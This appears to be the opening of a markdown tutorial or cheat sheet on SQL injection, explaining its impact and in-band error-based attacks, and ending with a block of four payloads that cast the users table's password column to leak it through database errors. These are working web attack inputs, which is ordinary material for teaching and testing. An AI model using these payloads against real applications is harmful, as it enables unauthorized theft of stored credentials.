## üìù What is SQL Injection?

SQL Injection (SQLi) is a web security vulnerability where an attacker manipulates SQL queries made by an application to its database. Exploiting SQLi can lead to unauthorized access, data manipulation, and even remote code execution.

---

## üö® Impact of SQL Injection Attacks

SQLi attacks can severely affect:

1. **Confidentiality**: Unauthorized access to sensitive data (like usernames, passwords, and credit card details).
2. **Integrity**: Altering or deleting data.
3. **Availability**: Shutting down services or making data unavailable.
4. **Remote Code Execution**: In advanced cases, executing commands on the server.

### 1Ô∏è‚É£ In-Band SQL Injection

In-band SQLi is the easiest and most common form of SQL injection, where the attacker uses the same communication channel to both launch the attack and retrieve results.

---

#### üîπ Error-Based SQL Injection

Forces the database to generate errors, revealing sensitive information through error messages.

**Payloads:**
```sql
' AND CAST((SELECT 1) AS int)--
' AND CAST((SELECT password FROM users LIMIT 1) AS bool)--
' AND CAST((SELECT password FROM users LIMIT 1 OFFSET 0) AS bool)--
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
